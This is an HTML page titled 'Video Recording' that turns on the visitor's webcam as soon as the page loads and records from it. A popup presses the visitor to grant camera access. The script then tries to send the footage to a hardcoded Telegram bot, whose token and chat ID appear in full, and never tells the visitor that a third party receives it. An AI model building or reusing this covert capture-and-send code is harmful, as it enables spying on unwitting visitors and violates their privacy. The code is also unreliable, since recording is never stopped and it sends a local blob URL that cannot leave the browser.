<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Recording</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        video {
            border: 1px solid #ddd;
        }
        #errorMessage {
            color: red;
            font-size: 18px;
            display: none;
        }
        #permissionPopup {
            display: none;
            position: absolute;
            top: 20%;
            left: 50%;
            transform: translateX(-50%);
            background: #fff;
            padding: 20px;
            border: 1px solid #ddd;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            border-radius: 5px;
            z-index: 100;
        }
        #permissionPopup button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <video id="videoElement" width="640" height="480" autoplay></video>
    <div id="errorMessage"></div>
    <div id="permissionPopup">
        <p>We need camera access to record video. Please enable camera permission in your browser settings.</p>
        <button onclick="requestCameraAccess()">Enable Camera</button>
    </div>
    <script>
        let mediaRecorder;
        let videoChunks = [];
        let videoElement = document.getElementById("videoElement");
        let errorMessage = document.getElementById("errorMessage");
        let permissionPopup = document.getElementById("permissionPopup");

        // Function to access user's webcam
        function accessCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoElement.srcObject = stream;
                    mediaRecorder = new MediaRecorder(stream);
                    
                    mediaRecorder.ondataavailable = function (event) {
                        videoChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = function () {
                        const videoBlob = new Blob(videoChunks, { type: "video/webm" });
                        const videoUrl = URL.createObjectURL(videoBlob);
                        sendVideoToTelegram(videoUrl); // Send the video after recording
                    };
                    
                    // Start recording
                    mediaRecorder.start();
                })
                .catch(error => {
                    console.error("Error accessing camera: ", error);
                    showPermissionPopup();  // Show the custom popup for camera permission
                });
        }

        // Show custom popup for camera permission request
        function showPermissionPopup() {
            permissionPopup.style.display = 'block';
        }

        // Attempt to request camera access again
        function requestCameraAccess() {
            permissionPopup.style.display = 'none';  // Close the popup
            accessCamera();  // Try to access the camera again
        }

        // Call the accessCamera function when the page is loaded
        window.onload = function () {
            accessCamera();
        };

        // Function to send the recorded video to Telegram bot
        function sendVideoToTelegram(videoUrl) {
            // Assuming you have already uploaded the video to a server and have a video URL
            // You would need to replace the videoUrl below with the actual hosted video URL
            const videoFileUrl = encodeURIComponent(videoUrl); // URL encode the video URL
            
            const telegramUrl = `https://api.telegram.org/bot7527990182:AAF0zFR9YqlRlWODalW8U6EiShJp5hKtjF4/sendVideo?chat_id=1789993737&video=${videoFileUrl}`;

            fetch(telegramUrl)
                .then(response => response.json())
                .then(data => {
                    console.log("Video sent successfully!", data);
                })
                .catch(error => {
                    console.error("Error sending video:", error);
                });
        }
    </script>
</body>
</html>
